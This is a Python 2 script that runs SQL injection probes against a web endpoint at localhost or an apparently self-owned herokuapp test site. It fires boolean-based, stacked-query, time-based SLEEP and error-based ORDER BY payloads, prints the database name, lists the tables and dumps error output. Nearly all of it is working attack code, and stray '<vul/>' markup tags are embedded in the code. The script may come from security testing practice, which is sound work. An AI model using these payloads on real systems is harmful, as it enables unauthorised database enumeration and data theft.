# -- coding: utf-8 --
import os
import sys
import urllib2
import httplib
import json as js
# from datetime import datetime
import time
import requests


def check_boolean_based_attack(url):
    arr = ["'%20OR%20'1'%20=%20'1';%20--%20", "\"%20OR%20'1'%20=%20'1';%20--%20", "%20OR%20'1'%20=%20'1';%20--%20"]
    for e in arr:
        opener = urllib2.build_opener()
        f = opener.open(url + e)
        if f.getcode() == 200:
            res = js.loads(f.read())
            <vul/>print "This web server is vulnerable for boolean based attack."</vul>
            print "The response after boolean attack is:"
            print res
            print
            break


def check_stack_query(url):
    req = url + "'%3B%20SELECT%20DATABASE()%3B%20--%20"
    opener = urllib2.build_opener()
    f = opener.open(req)
    database = js.loads(f.read())
    <vul/>print "This web server is vulnerable for Stacked Queries(Piggy Backing)."</vul>
    print "The Database's name is: "
    print database[1][0]['DATABASE()'] + "\n"

    req = url + "'%3B%20SHOW%20TABLES%3B%20--%20"
    f = opener.open(req)
    tables = js.loads(f.read())
    print "The tables in this database are: "
    for table in tables[1]:
        print table.values()[0]
    print


def check_time_based_attack(url):
    arr = ["'%20AND%20SLEEP(15);%20--%20", "\"%20AND%20SLEEP(15);%20--%20", "%20AND%20SLEEP(15);%20--%20"]
    for e in arr:
        a = time.time()
        opener = urllib2.build_opener()
        f = opener.open(url + e)
        b = time.time()
        duration = b - a
        if duration > 13:
            print "This web server is vulnerable for time based attack."
            print "The response time after boolean attack SLEEP(15) is: " + str(duration) + "\n"


def check__error_based_attack(url):
    for i in range(1, 1000):
        newUrl = url + "'%20ORDER%20BY%20" + str(i) + "%3B--%20"
        r = requests.get(newUrl)
        # print r.content
        # print r.status_code
        # print r.content.find("ER_BAD_FIELD_ERROR") != -1
        if r.status_code != 200 and r.content.find("ER_BAD_FIELD_ERROR") != -1:
            print "This web server is potentially vulnerable for error based attack. " \
                  "The suggestion is do not exposed detailed database error to the public."
            print "The error message is:"
            print r.content
            print
            break

online = "https://my-securitytest.herokuapp.com/getFriend/user1"
local = "http://localhost:3000/getFriend/user1"

<vul/>check_boolean_based_attack(local)
check_stack_query(local)
check__error_based_attack(local)

# check_time_based_attack(local)</vul>

# localhost:3000/getFriend/user1'; SELECT DATABASE(); --%20
# localhost:3000/getFriend/user1'; SHOW TABLES; --%20

#
# commands = {
#     'command1': ex1.check_stack_query,
#     'command2': ex1.check_if_database_error_exposed
# }
#
# if __name__ == '__main__':
#     command = os.path.basename(sys.argv[0])
#     if command in commands:
#         commands[command](*sys.argv[1:])
